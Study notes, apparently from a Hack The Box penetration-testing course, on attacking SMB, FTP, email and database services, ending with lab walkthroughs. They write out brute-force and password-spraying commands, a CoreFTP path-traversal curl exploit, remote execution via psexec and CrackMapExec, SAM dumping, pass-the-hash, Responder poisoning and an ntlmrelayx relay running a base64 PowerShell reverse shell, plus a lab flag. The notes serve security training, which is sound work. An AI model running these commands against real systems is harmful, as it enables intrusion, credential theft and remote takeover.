# Interacting with Common Services

## File Share Services

Services that provide, mediate, and monitor file transfers. Internal examples: SMB. NFS, FTP, TFTP, SFTP. Cloud examples: Dropbox, Google, Drive, OneDrive, SharePoint, AWS S3, Azure Blob, GCP Storage. This module focuses on internal services.

### Server Message Block (SMB)

Common in Windows networks. Interact via GUI, CLI, or tools.

### Windows -- GUI

Press `[Win] + R` and type the share path, e.g. `\\192.168.220.129\Finance`. Anonymous auth or a privileged user shows content directly; otherwise an authentication prompt appears. 

### Windows -- Command Shell (CMD)

`dir` lists a directory's files and subdirectories:

```cmd
C:\htb> dir \\192.168.220.129\Finance\
```

`net use` connects/disconnects a shared resource or maps it to a drive letter:

```cmd
C:\htb> net use n: \\192.168.220.129\Finance
```

With credentials:

```cmd
C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123
```

Count all files across subdirectories:

```cmd
C:\htb> dir n: /a-d /s /b | find /c ":\"
```


| Syntax | Description                              |
| ------ | ---------------------------------------- |
| `dir`  | Application                              |
| `n:`   | Directory or drive to search             |
| `/a-d` | Attribute filter; `-d` = not directories |
| `/s`   | Includes all subdirectories              |
| `/b`   | Bare format (no headers/summary)         |
| `      | find /c ":`                              |


Search filenames by keyword:

```cmd
C:\htb> dir n:\*cred* /s /b
C:\htb> dir n:\*secret* /s /b
```

`findstr` searches for a word inside text files:

```bash
c:\htb> findstr /s /i cred n:\*.*
```

Useful search termins: `cred`, `password`, `users`, `secrets`, `key`, plus source extensions like `.cs`, `.c`, `.go`, `.java`, `.php`, `.asp`, `.aspx`, `.html`.

### Windows -- PowerShell

PowerShell runs both Windows commands and cmdlets (CMD runs only Windows commands).

List a share:

```powershell
PS C:\htb> Get-ChildItem \\192.168.220.129\Finance\
```

Map a drive (replaces `net use`):

```powershell
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
```

Authenticate with a PSCredential object (a centralized way to manage username/password/credentials):

```bash
PS C:\htb> $username = 'plaintext'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
```

Count files (`Get-Children` / `gci` replaces `dir`):

```powershell
PS C:\htb> N:
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
```

Find specific items with `-Include`:

```powershell
PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

`Select-String` searches text patterns (like `grep`/`findstr`):

```powershell
PS C:\htb> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```



### Linux

Works whether the target is Windows or a Samba server. Requires `cifs-utils` (`sudo apt install cifs-utils`).

Mount a share:

```bash
sudo mkdir /mnt/Finance
sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```

Using a credential file:

```bash
$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

The `credentialfile` format:

```bash
username=plaintext
password=Password123
domain=.
```

Once mounted, use `find`/`grep`:

```bash
find /mnt/Finance/ -name *cred*
grep -rn /mnt/Finance/ -ie cred
```



### Other Services

FTP, TFTP, and NFS can also be mounted with different tools. The principle is the same: once mounted, use native Linux/Windows tools to interact. Investigate each new service's mechanisms and tooling as you encounter it.

## Email

Requires two protocols -- one to send, one to receive. SMTP delivers/sends mail. Retrieval uses POP3 or IMAP.

A mail client like Evolution (GNOME's mail client) can send and receive:

```bash
$ sudo apt-get install evolution
```

If you hit a `bwrap: Can't create file at ...` error, start it with:

```bash
export WEBKIT_FORCE_SANDBOX=0 && evolution
```

Use the mail server's domain/IP. For SMTPS/IMAPS, pick the right encryption (TLS on a dedicated port, or STARTTLS after connecting). "Check for Supported Types" confirms which auth method the server supports.

## Databases

Types include hierarchical, NoSQL, and SQL relational. This module focuses on the two most common relational engines: MySQL and MSSQL. Three ways to interact: command-line utilities, programming languages, or a GUI app (HeidiSQL, MySQL Workbench, SSMS).

### Command Line Utilities

MSSQL -- `sqsh` (Linux) or `sqlcmd` (Windows). `sqsh` provides shell-like features (variables, aliasing, pipes, job control, history):

```bash
$ sqsh -S 10.129.20.13 -U username -P Password123
```

```cmd
C:\htb> sqlcmd -S 10.129.20.13 -U username -P Password123
```

MySQL -- `mysql` (Linux) / `mysql.exe` (Windows)

```bash
$ mysql -u username -pPassword123 -h 10.129.20.13
```

```cmd
C:\htb> mysql.exe -u username -pPassword123 -h 10.129.20.13
```



### GUI Applications

MySQL -> MySQL Workbench; MSSQL -> SSMS (Windows only). dbeaver is a cross-platform alternative supporting MSSQL, MySQL, PostgreSQL, and more:

```bash
$ sudo dpkg -i dbeaver-<version>.deb
$ dbeaver &
```

To connect, you need credentials, target IP + port, and the engine type.

Once connected (CLI or GUI), use Transact-SQL statements to enumerate databases/tables for sensitive data (usernames, passwords). With sufficient privileges, you may execute comands as the MSSQL service account.

## Tools Reference


| SMB                             | FTP       | Email                        | Databases                               |
| ------------------------------- | --------- | ---------------------------- | --------------------------------------- |
| smbclient                       | ftp       | Thunderbird                  | mssql-cli                               |
| CrackMapExec                    | lftp      | Claws                        | mycli                                   |
| SMBMap                          | ncftp     | Geary                        | [mssqlclient.py](http://mssqlclient.py) |
| Impacket                        | filezilla | MailSpring                   | dbeaver                                 |
| [psexec.py](http://psexec.py)   | crossftp  | mutt                         | MySQL Workbench                         |
| [smbexec.py](http://smbexec.py) |           | mailutils                    | SSMS                                    |
|                                 |           | sendEmail / swaks / sendmail |                                         |




## General Troubleshooting

When you can't reach a resource, common causes are: authentication, privileges, network connection, firewall rules, and protocol support. Use returned error codes to search official docs or forums for similar solved issues.

## Key Takeaways

- Always learn a service's purpose, interaction methods, and tooling before attacking it. 
- SMB filename/content searches (`dir`, `findstr`, `Get-ChildItem`, `Select-String`, `find`, `grep`) are the core credential-hunting workflow -- reuse the `cred/password/secret/key` keyword set here just as you did in the Credential Hunting module.
- PowerShell is a superset of CMD; PSCredential objects are the clean way to pass creds non-interactively.
- On Linux, mounting via `cifs-utils` lets you apply familiar Unix tooling regardless of whether the target is Windows or Samba.
- dbeaver is the go-to cross-platform DB client when SSMS (Windows-only) isn't an option on Kali.



# The Concept of Attacks



## Overview

To attack any service effectively, you need a mental concept -- a reusable pattern that applies across all services rather than memorizing isolated attacks per protocol. The analogy: most houses share a general structure (foundation, walls, roof), while materials and design vary. Likewise, all service attacks share a common structure, even though the specific exploitation methods differ.

Building these pattern templates is an ongoing process, not a finished product -- the templates grow as you encounter more cases.

## The Concept of Attacks

Every vulnerability fits into four categories that form a linear cycle:

1. Source: performs a request to a process
2. Process: where the vulnerability gets triggered
3. Privileges: the permissions the process runs with
4. Destination: where the computed/forwarded result goes

The cyclce is deliberately linear: a Destination doesn't automatically become the Source of a new task. For any task to exist it needs information (Source), a planned process (Process), and a goal (Destination), with Privileges controlling how the information is processed.

### 1. Source

Generalized as the source of information used by a process. Protocol doesn't matter -- the source is what gets exploited. Common source types:


| Information Source | Description                                                                                          |
| ------------------ | ---------------------------------------------------------------------------------------------------- |
| Code               | Results of already-executed program code, from various program functions                             |
| Libraries          | Collections of resources: config data, docs, prebuilt code, subroutines, classes, values, type specs |
| Config             | Static/prescribed values that determine how a process handles information                            |
| APIs               | Interface used to retrieve or provide information                                                    |
| User Input         | Manual entry of values by a person for processing                                                    |


Log4j example: An attacker manipulates the HTTP User-Agent header, inserting a JNDI lookup. Instead of a normal value like `Mozilla 5.0`, the JNDI lookup is what gets processed.

### 2. Process

The processing of information forwarded by the source, according to logic defined in the program code. Since developers control this logic (classes, functions, calculations, loops), most vulnerabilities live in the program code executed by the process.


| Process Component | Description                                                                      |
| ----------------- | -------------------------------------------------------------------------------- |
| PID               | Process-ID identifying the running/started process (carries assigned privileges) |
| Input             | Information supplied by a user or a programmed function                          |
| Data processing   | Hard-coded functions dictating how received info is handled                      |
| Variables         | Placeholders for information passed between functions                            |
| Logging           | Events documented and stored in a register/file, leaving info in the system      |


Log4j example: The process logs the User-Agent as a string and stores it. The flaw is misinterpretation of the string, causing execution of a request instead of a log entry. 

### 3. Privileges

Permissions controlling what tasks/actions a process may perform -- compared to a bus ticket valid only for a specific region. The system checks a process's privileges before approving its action.


| Privilege | Description                                                                      |
| --------- | -------------------------------------------------------------------------------- |
| System    | Highest privilege, allows any modification. `SYSTEM` on Windows, `root` on Linux |
| User      | Permissions assigned to a specific user (services often get dedicated users)     |
| Groups    | Categorization of one or more users sharing permissions                          |
| Policies  | Determine execution of app-specific commands, for individual or grouped users    |
| Rules     | Permissions handled from within the applications themselves                      |


Log4j example: What made it so dangerous were the privileges. Because logs are sensitive and stored in protected locations, apps implementing Log4j often ran as administrator -- so the misinterpreted User-Agent executed user-supplied code with admin rights.

### 4. Destination

Every task has a goal -- otherwise it's pointless. The result is stored or forwarded, either locally or over the network. Completing that storage/forwarding closes the cycle. 


| Destination | Description                                                              |
| ----------- | ------------------------------------------------------------------------ |
| Local       | Results processed/stored within the system where the process ran         |
| Network     | Results forwarded to a remote interface (IP, service, or entire network) |


Log4j example: The misinterpreted User-Agent triggers a JNDI lookup executed with admin privileges, querying an attacker-controlled remote server (the Destination). That server returns a malicious Java class, which executes in the same process -> remote code execution (RCE).

## The Full Log4j Attack, Mapped to the Concept



### Phase 1 -- Initiation of the Attack


| Step | Log4j                                                                  | Category    |
| ---- | ---------------------------------------------------------------------- | ----------- |
| 1    | Attacker manipulates the User-Agent with a JNDI lookup                 | Source      |
| 2    | Process misinterprets the User-Agent, executing the command            | Process     |
| 3    | Command runs with admin privileges (logging permissions)               | Privileges  |
| 4    | JNDI lookup points to attacker's server holding a malicious Java class | Destination |


The cycle then restarts -- this time to gain remote access.

### Phase 2 -- Trigger Remote Code Execution


| Step | Log4j                                                                        | Category    |
| ---- | ---------------------------------------------------------------------------- | ----------- |
| 5    | Malicious Java class retrieved from attacker's server becomes the new source | Source      |
| 6    | Malicious code is read in, often granting remote access                      | Process     |
| 7    | Code executes with admin privileges (logging permissions)                    | Privileges  |
| 8    | Code connects back over the network, giving attacker remote control          | Destination |




## Key Takeaways

- The Source -> Process -> Privileges -> Destination pattern is a reusable lens for any service attack, regardless of protocol.
- Most vulnerabilities live in the Process -- the developer's code handling the input.
- Privileges determine impact: the same bug is far more dangerous when the process runs as SYSTEM/root (the core lesson of Log4j).
- A single exploit can loop the cycle multiple times - Log4j's Destination (attacker server) feeds a second cycle's Source to achieve RCE.
- Beyond understanding exploits, use this template for debugging your own exploits during development and for step-by-step source code analysis.



# Service Misconfigurations

Misconfigurations occur when a system administrator, technical support, or developer fails to correctly configure an application, website, desktop, or server's security framework -- creating open pathways for unauthorized users. Below are the most common misconfigurations of common services.

## Authentication

Historically, services shipped with default credentials, and many admins never changed them. Modern software usually forces credential setup during installation, but default credentials still appear, especially in older applications.

Even without defaults, admins may set weak or blank passwords, intending to change them later. Password policies should enforce minimum complexity to avoid combinations like:

```bash
admin:admin
admin:password
admin:<blank>
root:12345678
administrator:Password
```

Workflow: after grabbing the service banner, identify possible default credentials; if none exist, try the weak username/password combinations above. 

## Anonymous Authencation

A service can be configured to allow anonymous authentication, letting anyone with network connectivity reach the service without being prompted to authenticate.

## Misconfigured Access Rights

When user accounts hold incorrect permissions. Example: a user meant only to upload files to an FTP server is instead given read access to every document --- potentially exposing config files for other services, plaintext credentials, usernames, proprietary information, and PII. The larger danger is granting lower-privileged users access to information reserved for managers or administrators.

Admins should plan an access-rights strategy using approaches like Role-Based Access Control (RBAC) ir Access Control Lists (ACL).

## Unnecessary Defaults

Initial device/software configuration (settings, features, files, credentials) is aimed at usability rather than security. Leaving defaults in place in production is poor practice --- attackers can find default credentials or abuse weak settings with a quick internet search. Unnecessary defaults are the settings you must change to reduce the attack surface. 

Security Misconfiguration appears in the OWASP Top 10. Default-related items include:

- Unnecessary features enabled or installed (ports, services, pages, accounts, privileges)
- Default accounts and passwords still enabled and unchanged
- Error handling revealing stack traces or overly informative errors
- Upgraded systems where the latest security features are disabled or insecurely configured.



## Preventing Misconfiguration

The simplest risk-control strategy is to lock down critical infrastructure and allow only desired behavior, disabling any communitation the program doesn't require:

- Disable admin interfaces
- Turn off debugging
- Disable default usernames and passwords
- Configure the server to prevent unauthorized access, directory listing, and similar issues
- Run scans and audits regularly to catch future misconfigurations or missing fixes

The OWASP Top 10 also recommends securing installation processes:

- A repeatable hardening process for quickly deploying locked-down environments; keep Dev, QA, and Production configured identically but with different credentials in each, and automate it.
- A minimal platform --- remove unused features, components, documentation, and samples.
- A task to review and update configurations against security notes, updates, and patches as part of patch management (ties to A06:2021 - Vulnerable and Outdated Components); review cloud storage permissions (e.g., S3 buckets).
- A segmented application architecture with effective separation via segmentation, containerization, or cloud security groups (ACLs).
- Security directives sent to clients, e.g., security headers.
- An automated verification process confirming configuration effetiveness across all environments.



## Key Takeaways

- Misconfigurations are among the highest-value, lowest-effort findings --- always test default/wak/blank credentials and anonymous access right after banner grabbing.
- Access-rights misconfigurations turn a low-privilege foothold into a data-exposure goldmine; enumerate what a compromised accountcan actually read.
- Defense reduces to a repeatable principle: harden by default, remove the unnecessary, and verify continuously.



# Finding Sensitive Information



## Overview

When attacking a service, you play a detective role. Collect as much information as possible and observe details carefully, because every single piece of information matters.

## The Chained-Access Example

A client engagement targeting email, FTP, databases, and storage, with the goal of achieving Remote Code Execution (RCE) on any service:

1. Enumeration begins; anonymous access is tried on all services (only FTP allows it).
2. An empty file named `johnsmith` is found on the FTP server. Using `johnsmith` as FTP username/password fails.
3. The same `johnsmith:johnsmith` combo is tried against email and succeds.
4. Searching emails for the word `password` returns many results; one contains John's MSSQL database credentials.
5. Logging into the database and using its built-in command-execution functionality yields RCE on the database server. Goal met.

Lesson: A misconfigured service exposed a seemingly insignificant detail (`johnsmith`) that chained into full RCE. This why every detail matters during enumeration.

## What Counts as Sensitive Information

Includes, but not limited to:

- Usernames
- Email addresses
- Passwords
- DNS records
- IP addresses
- Source code
- Configuration files
- PII

This module covers finding sensitive information across File Shares, Email, and Databases, along with methods and tools to automate discovery.

## Understanding What to Look For

Every target is unique --- familiarize yourself with its processes, procedures, business model, and purpose. Once you understand the target, you can reason about what information is valuable to them and useful for your attack.

Two key elements:

1. Understand the service and how it works
2. Know what you're looking for



## Key Takeaways

- Enumeration is credential-chaining: a trivial artifact on one service can unlock another (the `johnsmith` FTP file -> email login -> DB creds -> RCE path).
- Reuse discovered strings as usernames and passwords across every other service --- credential reuse is the connective tissue of these attacks.
- Effective hunting requires both knowing how the service works and knowing what to look for --- one without the other leaves findings on the table.



# Attacking FTP



## Overview

FTP (File Transfer Protocol) is a standard protocol for transferring files between computers and performing directory/file operations (changing directory, listing, renaming, deleting). It listens on TCP port 21 by default.

To attack an FTP server, you can abuse misconfigurations or excessive privileges, exploit known vulnerabilities, or discover new ones. After gaining access, examine the directory contents for sensitive/critical information. Most companies use FTP for software or website development.

## Enumeration

Nmap default scripts (`-sC`) include ftp-anon, which checks whether the server allows anonymous logins. Version enumeration (`-sV`) returns the FTP banner, which often reveals the version. Interact with the service using the `ftp` client or `nc`.

```bash
sudo nmap -sC -sV -p 21 182.168.2.142
```

In the sample output, `ftp-anon` confirms anonymous login is allowed (FTP code 230), and the `incoming` directory is flagged [NSE: writeable] --- a notable finding, since a writeable directory enables uploads.

## Misconfigurations --- Anonymous Authentication

Anonymous login uses the username `anonymous` with no password. This is dangerous if read/write permissions aren't set corretly --- the company may have stored sensitive information in a folder the anonymous user can reach, letting you download it or upload malicious scripts. Combined with another vulnerability (e.g., path traversal in a web app), an uploaded file could be located and executed as PHP code.

```bash
ftp 192.168.2.142
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
```



### Core FTP client commands


| Command     | Purpose                           |
| ----------- | --------------------------------- |
| `ls` / `cd` | Navigate directories (like Linux) |
| `get`       | Download a single file            |
| `mget`      | Download multiple files           |
| `put`       | Upload a single file              |
| `mput`      | Upload multiple files             |
| `help`      | List available commands           |




## Protocol Specific Attacks

Important framing: you're not attacking the protocol itself but the services that use it. Since many services implement a single protocol and process information differently, attacks vary by service. 

### Brute Forcing

If anonymous auth isn't available, brute-force the login with pre-generated username/password lists. Medusa is one such tool:

```bash
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```


| Medusa Flag | Description                   |
| ----------- | ----------------------------- |
| `-u`        | Single username               |
| `-U`        | File with a list of usernames |
| `-P`        | File with a list of passwords |
| `-M`        | Target protocol (e.g., `ftp`) |
| `-h`        | Target hostname or IP         |


> Note: Most modern applications block brute forcing. Password Spraying is often more effective.



### FTP Bounce Attack

A network attack that uses an FTP server to relay outbound traffic to another device. The attacker abuses the PORT command to trick the FTP connection into running commands against a device other than the intended server.

Scenario: An internet-exposed server `FTP_DMZ` and a non-exposed `Internal_DMZ` sit in the same network. You use your connection to `FTP_DMZ` to scan `Internal_DMZ`'s open ports via the bound, then use that intel in further attacks.

Nmap's `-b` flag performs the bounce scan:

```bash
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

Modern FTP servers block this by default, but misconfigured ones remain vulnerable.

## Key Takeaways

- After babber-grabbing with `nmap -sC -sV -p 21`, immediately check for anonymous login and, crucially, any writeable directories --- the combination is what turns FTP access into a foothold (upload + execute chain).
- You attack the service, not the protocol --- behavior depends on how each FTP implementation and its permissions are configured.
- Brute forcing is the fallback when anonymous auth fails, but prefer password spraying against modern targets to avoid lockouts.
- The FTP bounce attack is a pivoting technique --- worth remembering for your upcoming Pivoting/Tunneling module, since it uses a reachable host to reach an unreachable one.



## Connect to HTB



#### What port is the FTP service running on?

```bash
nmap -p- -sV -sC 10.129.203.6 --min-rate 5000
Not shown: 65502 filtered tcp ports (no-response), 29 closed tcp ports (conn-refused)
PORT    STATE SERVICE    VERSION
22/tcp  open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
53/tcp  open  tcpwrapped
139/tcp open  tcpwrapped
445/tcp open  tcpwrapped

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1m22s
| smb2-time: 
|   date: 2026-07-31T14:06:13
|_  start_date: N/A


sudo nmap -p- -sV -sC -sU 10.129.203.6 --min-rate 5000 # It doesn't work

nmap -p- -sV -sC 10.129.203.6

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2121/tcp open  ftp         ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
|_-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1m22s
|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-07-31T15:34:24
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

ftp 10.129.203.6 -p 2121
get users.list
get passwords.list

hydra -l robin -P passwords.list ftp://10.129.203.6:2121
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-31 11:42:11
[DATA] max 16 tasks per 1 server, overall 16 tasks, 250 login tries (l:1/p:250), ~16 tries per task
[DATA] attacking ftp://10.129.203.6:2121/
[STATUS] 154.00 tries/min, 154 tries in 00:01h, 96 to do in 00:01h, 16 active
[2121][ftp] host: 10.129.203.6   login: robin   password: 7iz4rnckjsduza7
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-31 11:43:27

ftp 10.129.203.6 -p 2121
> robin:7iz4rnckjsduza7

get flag.txt
cat flag.txt
> HTB{ATT4CK1NG_F7P_53RV1C3}
```



# Latest FTP Vulnerabilities



## Overview

This section illustrates an FTP attack through a concrete example, mapped to the Concept of Attacks (Source -> Process -> Privileges -> Destination), kept deliberately non-thecnical to reinforce the concept.

## CVE-2022-22836 --- CoreFTP before build 727

An FTP service that doesn't correctly process the HTTP PUT request, leading to an authenticated directory/path traversal and arbitrary file write vulnerability. It lets you write files outside the directory the service is supposed to be restricted to.

## The Concept of the Attack

The service normally uses an HTTP POST request to upload files, but CoreFTP also permits an HTTP PUT request --- which can be abused to write content to files. The exploit is a single cURL command:

```bash
$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

Breakdown of the command:


| Flag                                        | Purpose                              |
| ------------------------------------------- | ------------------------------------ |
| `-X PUT`                                    | Raw HTTP PUT request                 |
| `--basic -u <username>:<password>`          | Basic authentication                 |
| `--path-as-is https://<IP>/../../../whoops` | File path (with traversal sequences) |
| `--data-binary "PoC."`                      | File content                         |
| `-H "Host: <IP>"`                           | Host header set to the target IP     |
| `-k`                                        | Ignore certificate validation        |


In short: the process misinterprets the user's path input, bypassing access restrictions on the folder. Write permissions on the PUT request aren't properly controlled, allowing file creation outside authorized folders.

## Mapped to the Concept of Attacks

**Part 1 — Directory Traversal**


| Step | Action                                                                                                                | Category    |
| ---- | --------------------------------------------------------------------------------------------------------------------- | ----------- |
| 1    | User crafts an HTTP PUT with content **plus escape characters** to break out of the restricted area                   | Source      |
| 2    | Process takes over and processes the modified request, contents, and path                                             | Process     |
| 3    | App checks path authorization; since restrictions only cover one folder, they're **bypassed** by traversing out of it | Privileges  |
| 4    | Another process is tasked with writing the user's content to the local system                                         | Destination |


Escape characters (`../../../../`) bypass the application's constraints — then the cycle **restarts** to write the content.

**Part 2 — Arbitrary File Write**


| Step | Action                                                                                                   | Category    |
| ---- | -------------------------------------------------------------------------------------------------------- | ----------- |
| 5    | Same user input reused: filename (`whoops`) and content (`--data-binary "PoC."`)                         | Source      |
| 6    | Process writes the desired content to the specified file                                                 | Process     |
| 7    | Because restrictions were bypassed in the traversal, the service **approves** the write                  | Privileges  |
| 8    | The user-specified file (`whoops`) with its content (`PoC.`) becomes the destination on the local system | Destination |




### Result

The file appears on the target with the chosen content:

```cmd
C:\> type C:\whoops
PoC.
```



## Key Takeaways

- This is an authenticated vuln --- you still need valid credentials, so it pairs naturally with the anonymous-access and brute-forcing techniques from the previous section.
- The exploit is a clean, real-world illustration of the Concept of Attacks looping twice: traversal (break out) -> arbitrary write (drop the file), the same pattern you saw with Log4j.
- The core flaw is path input misinterpretation in the Process plus inadequate write-permission control in Privileges --- the traversal characters (`../../`) are the whole mechanism.
- Practically, an arbitrary file write is rarely the end goal --- it's a primitive you'd chain toward code execution (e.g., writing to a web root or a startup location).



# Attacking SMB



## Overview

SMB (Server Message Block) provides shared access to files and printers across networked nodes. Originally designed to run over NetBIOS over TCP/IP (NBT) using TCP 139 and UDP 137/138; since Windows 2000, it can run directly over TCP 445 without NetBIOS. Modern Windows uses SMB over TCP but keeps NetBIOS as failover. 

- Samba = the Unix/Linux open-source implementation of SMB.
- Port 445 = SMB directly over TCP/IP; Port 139 = SMB with NetBIOS over TCP/IP (typically non-Windows hosts or Windows with NetBIOS enabled).
- MSRPC (Microsoft RPC) is closely related --- it lets a developer call a procedure in a local/remote process, and can use SMB named pipes as its transport.



## Enumeration

Nmap gives different results by implementation/OS; against Windows, version info is usually absent (Nmap guesses the OS instead). Scan 139 and 445:

```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

Reveals SMB version (e.g., Samba smbd 4.6.2), hostname, and inferred OS.

## Misconfigurations: Null Sessions (Anonymous Auth)

SMB can be configured to require no authentication. A null session (no username/password). This exposes shares, usernames, groups, permissions, policies and services. Tools supporting null sessions: smbclient, smbmap, rpcclient, enum4linux.

### File shares:

```bash
smbclient -N -L //10.129.14.128          # -N null session, -L list shares
smbmap -H 10.129.14.128                    # lists shares WITH permissions
smbmap -H 10.129.14.128 -r notes           # -r/-R browse (recursive)
smbmap -H 10.129.14.128 --download "notes\note.txt"
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

smbmap's advantage: it shows permissions per share (e.g., `READ, WRITE` = YOU CAN UPLOAD/DOWNLOAD).

### RPC  enumeration:

```bash
rpcclient -U'%' 10.10.110.17
rpcclient $> enumdomusers          # enumerate domain users
```

enum4linux(-ng) automates SMB enumeration using nmblookup, net, rpcclient, smbclient (pulling workgroup/domain, users, OS, groups, shares, and password policy):

```bash
./enum4linux-ng.py 10.10.11.45 -A -C
```



## Protocol Specific Attacks: Getting Credentials

If no null session, you need credentials. Two approaches:

Brute forcing: Try many passwords per account; risks account lockout.
Password spraying (preferred): One common password gainst many usernames, avoiding lockout. Safe rul of thumb: 2-3 attempts, waiting 30-60 min between. Use CrackMapExec (CME):

```bash
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

- `continue-on-success`: keep spraying after a valid hit (great for one password vs. a large user list).
- `--local-auth`: for non-domain-joined machines.
- CME exits on first success by default.



## Attacking Windows SMB

Your actions are limited by the compromised user's privileges. With Administrator/privileged access you can perform: RCE, extract SAM hashes, enumerate logged-on users, Pass-the-Hash.

### Remote Code Execution

PsExec (Sysinternals) executes processes on remote systems: it deploys a service image to the `ADMIN$` share, uses DCE/RPC over SMB to reach the Service Control Manager, starts the service, and created a named pipe for commands. Linux implementations:

- Impacket PsExec: uses RemComSvc
- Impacket SMBExec: no RemComSvc; spins up a local SMB server for output (useful when target has no writeable share)
- Impacket atexec: executes via Task Scheduler
- CrackMapExec: includes smbexec and atexec
- Metasploit PsExec

```bash
impacket-psexec administrator:'Password123!'@10.10.110.17
# → nt authority\system
```

Same options apply to impacket-smbexec and impacket-atexec.

CrackMapExec can run commands across multiple hosts:

```bash
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

`-x` runs CMD, `-X` runs PowerShell. If `--exec-method` is unset, CME tries atexec first, then fall back to smbexec.

### Enumerating Logged-on Users

Across a subnet sharing a local admin account:

```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```



#### Extract Hashes from SAM

The SAM (Security Account Manager) database stores local password hashes. With admin rights, dump them for reuse, cracking, or Pass-the-Hash:

```bash
$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```



#### Pass-the-Hash (PtH)

If you have an NTLM hash but can't crack it, authenticate using the hash directly instead of the plaintext password. Works with Impacket tools, SMBMap, CME, etc.:

```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```



## Forced Authentication Attacks

Abuse SMB by standing up a fake SMB server to capture users'NetNTLM v1/v2 hashes. The main tool is Responder (an LLMNR, NBT-NS, MDNS poisoner):

```bash
sudo responder -I ens33
```

How it works — Windows name resolution order: hosts file → local DNS cache → configured DNS server → multicast query (LLMNR/NBT-NS) to the whole network. If a user mistypes a share (`\\mysharefoder\`), all normal resolution fails and the machine multicasts — Responder answers on behalf of the requested server. Since responses aren't integrity-checked, the victim trusts the malicious server and sends its NetNTLM hash.

Captured hashes are saved to `/usr/share/responder/logs/`. Crack NetNTLMv2 with hashcat mode 5600:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

> Note: multiple different hashes for one account are normal: NTLMv2 salts each with a randomized client/server challenge, so the hashes differ but represent the same password.

If you can't crack it, relay it with impacket-ntlmrelayx. First disable Responder's own SMB server (`SMB = Off` in `/etc/responder/Responder.conf`), then relay:

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

By default it dumps the SAM DB; add `-c` to execute a command (e.g., a base64 PowerShell reverse shell from revshells.com):

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64>'
nc -lvnp 9001    # catch the shell → nt authority\system
```



## RPC --- Making Changes

Beyond enumeration, RPC (via rpcclient) can change a user's password, create a new domain user, or create a new shared folder (subject to the target's configuration allowing it).

## Key Takeaways

- **Always try null sessions first** — smbmap's per-share permissions instantly reveal `READ, WRITE` shares worth exploiting.
- **Password spraying beats brute forcing** on modern targets; respect the lockout threshold (2–3 tries, 30–60 min gaps).
- This section directly reinforces your recent CPTS work: `--sam` **dumping + Pass-the-Hash** is the same primitive you used with evil-winrm during the ESC8 chain — SAM/NTLM hashes are interchangeable across these tools.
- **Responder → crack → or relay** is the canonical forced-auth workflow. Note the connection to your ESC8 lab: `ntlmrelayx` is the exact same tool, just relaying to AD CS web enrollment instead of dumping SAM.
- Remember the `SMB = Off` step in `Responder.conf` before relaying — Responder and ntlmrelayx both want port 445, so they can't both hold it.



## Connect to HTB



#### What is the name of the shared folder with READ permissions?

```bash
source venv/bin/activate
pip3 install smbmap
smbmap -H 10.129.203.6

